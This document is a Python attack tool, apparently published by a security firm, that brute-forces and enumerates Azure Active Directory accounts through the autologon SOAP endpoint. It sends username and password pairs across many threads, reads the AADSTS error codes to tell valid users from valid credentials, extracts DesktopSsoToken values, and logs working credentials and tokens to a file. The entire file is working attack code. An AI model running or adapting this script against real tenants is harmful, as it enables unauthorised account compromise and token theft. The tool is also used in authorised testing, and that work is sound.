#!/usr/bin/python3

# 2021.09.30 - @nyxgeek - TrustedSec
# Adapted from https://securecloud.blog/2019/12/26/reddit-thread-answer-azure-ad-autologon-endpoint/
# Mentioned here https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/
# Thanks to @jarsnah12 for code contribution!

import requests
from requests.exceptions import ConnectionError, ReadTimeout, Timeout
import datetime
import re
import os
import time
import threading
from threading import Semaphore
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import uuid
import argparse

writeLock = Semaphore(value = 1)

# initiate the parser
parser = argparse.ArgumentParser()
parser.add_argument("-d", "--domain", help="target domain name", required=True)
parser.add_argument("-u", "--username", help="user to target")
parser.add_argument("-U", "--userfile", help="file containing users to target")
parser.add_argument("-p", "--password", help="password")
parser.add_argument("-o", "--output", help="file to write output to (default: BRUTE_OUTPUT.txt)")
parser.add_argument("-v", "--verbose", help="enable verbose output", action='store_true')
parser.add_argument("-t", "--threads", help="total number of threads (defaut: 10)")

# Preset some variables
verbose = False
isUser = False
isUserFile = False
outputfile = 'BRUTE_OUTPUT.txt'

# Set up our GUIDs - I don't think we need to generate each time
UserTokenGuid= "uuid-" + str(uuid.uuid4())
MessageIDGuid = "urn:uuid:" + str(uuid.uuid4())
requestid = str(uuid.uuid4())

# Our base XML
data = """<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
    <a:MessageID>MessageIDPlaceholder</a:MessageID>
    <a:ReplyTo>
      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
    </a:ReplyTo>
    <a:To s:mustUnderstand="1">https://autologon.microsoftazuread-sso.com/dewi.onmicrosoft.com/winauth/trust/2005/usernamemixed?client-request-id=30cad7ca-797c-4dba-81f6-8b01f6371013</a:To>
    <o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" s:mustUnderstand="1">
      <u:Timestamp u:Id="_0">
        <u:Created>2019-01-02T14:30:02.068Z</u:Created>
        <u:Expires>2019-01-02T14:40:02.068Z</u:Expires>
      </u:Timestamp>
      <o:UsernameToken u:Id="UsernameTokenPlaceholder">
        <o:Username>UsernamePlaceholder</o:Username>
        <o:Password>PasswordPlaceholder</o:Password>
      </o:UsernameToken>
    </o:Security>
  </s:Header>
  <s:Body>
    <trust:RequestSecurityToken xmlns:trust="http://schemas.xmlsoap.org/ws/2005/02/trust">
      <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
        <a:EndpointReference>
          <a:Address>urn:federation:MicrosoftOnline</a:Address>
        </a:EndpointReference>
      </wsp:AppliesTo>
      <trust:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</trust:KeyType>
      <trust:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</trust:RequestType>
    </trust:RequestSecurityToken>
  </s:Body>
</s:Envelope>
"""

# read arguments from the command line
args = parser.parse_args()

if args.domain:
    #print("Setting target to %s" % args.domain)
    domain = args.domain
    print("Domain is ", domain)

if args.password:
    password = args.password.rstrip()
    print("Setting password as: %s" % password)

if args.output:
    outputfile = args.output

if args.verbose:
    verbose = True

if args.username:
    username = args.username.rstrip()
    print("Checking username: %s" % username)
    isUser = True


if args.userfile:
    print("Reading users from file: %s" % args.userfile)
    userfile = args.userfile
    isUserFile = True

if args.threads:
    thread_count = args.threads
else:
    thread_count = 10




#@retry
def checkURL(userline):
    username = userline.rstrip()
    if not ( "@" in username ):
        if verbose:
            print("No email address detected, converting to email format")
        username = username + "@" + domain + ""

    if verbose:
        print("Username is {}, Password is {}, Domain is {}".format(username, password, domain))

    # Setting up our XML File
    tempdata = data
    tempdata = tempdata.replace("UsernameTokenPlaceholder", UserTokenGuid)
    tempdata = tempdata.replace("MessageIDPlaceholder", MessageIDGuid)
    tempdata = tempdata.replace("UsernamePlaceholder", username)
    tempdata = tempdata.replace("PasswordPlaceholder", password)

    request_headers = {'client-request-id': requestid , 'return-client-request-id':'true', 'Content-type':'application/soap+xml; charset=utf-8'}
    url = "https://autologon.microsoftazuread-sso.com/" + domain + "/winauth/trust/2005/usernamemixed?client-request-id=" + requestid  + ""

    if verbose:
        writeLock.acquire()
        print("Url is: %s" % url)
        writeLock.release()

    requests.packages.urllib3.disable_warnings()

    try:
        r = requests.post(url, data=tempdata, headers=request_headers, timeout=2.0)

    except requests.ConnectionError as e:
        if verbose:
            print("Error: %s" % e)
    except requests.Timeout as e:
        if verbose:
            print("Error: %s" % e)
        print("Read Timeout reached, sleeping for 3 seconds")
        time.sleep(3)
    except requests.RequestException as e:
        if verbose:
            print("Error: %s" % e)
        print("Request Exception - weird. Gonna sleep for 3")
        time.sleep(3)
    except:
        print("Well, I'm not sure what just happened. Onward we go...")
        time.sleep(3)

    xmlresponse = str(r.content)
    credentialset = username + ":" + password


    # check our resopnse for error/response codes
    if "AADSTS50034" in  xmlresponse:
        print("[-] Username not found:{}".format(credentialset))
    elif "AADSTS50126" in xmlresponse:
        print("[+] VALID USERNAME, invalid password :{}".format(credentialset))
        writeLock.acquire()
        with open(outputfile,"a") as outfilestream:
            outfilestream.write("[+] FOUND VALID USERNAME:{}\n".format(credentialset))
        writeLock.release()
    elif "DesktopSsoToken" in xmlresponse:
        print("[+] VALID CREDS! :{}".format(credentialset))
        result = re.findall(r"<DesktopSsoToken>.{1,}</DesktopSsoToken>", xmlresponse)
        if (result):
            print("[+] GOT TOKEN FOR:{}:{}".format( username, result))
        writeLock.acquire()
        with open(outputfile,"a") as outfilestream:
            outfilestream.write("[+] VALID CREDS:{}\n".format(credentialset))
            outfilestream.write("[+] TOKEN FOUND :{}:{}\n".format(username, result))
        writeLock.release()
    elif "AADSTS50056" in xmlresponse:
        print("[+] VALID USERNAME, no password in AzureAD:{}".format(credentialset))
        writeLock.acquire()
        with open(outputfile,"a") as outfilestream:
            outfilestream.write("[+] FOUND USERNAME, no password in AzureAD :{}\n".format(credentialset))
        writeLock.release()
    elif "AADSTS80014" in xmlresponse:
        print("[+] VALID USERNAME, max pass-through authentication time exceeded :{}".format(credentialset))
        writeLock.acquire()
        with open(outputfile,"a") as outfilestream:
            outfilestream.write("[+] FOUND USERNAME, max pass-through authentication time exceeded :{}\n".format(credentialset))
        writeLock.release()
    elif "AADSTS50053" in xmlresponse:
        print("[?] SMART LOCKOUT DETECTED - Unable to enumerate:{}".format(credentialset))
    else:
        print("[!] I have NO clue what just happened. sorry. ", credentialset)
        print(xmlresponse)



def checkUserFile():
    f = open(userfile)
    listthread=[]
    for userline in f:
        while int(threading.activeCount()) >= int(thread_count):
            time.sleep(1)
        #print "Spawing thread for: " + userline + " thread(" + str(threading.activeCount()) +")"
        x = threading.Thread(target=checkURL, args=(userline,))

        listthread.append(x)
        x.start()
    f.close()

    for i in listthread:
        i.join()
    return


if __name__ == '__main__':

    print("\n+-----------------------------------------+")
    print("|          AzureAD AutoLogon Brute          |")
    print("|     2021.09.30 @nyxgeek - TrustedSec      |")
    print("+-----------------------------------------+\n")

    if isUser:
        checkURL(username)

    if isUserFile:
        checkUserFile()

    quit()
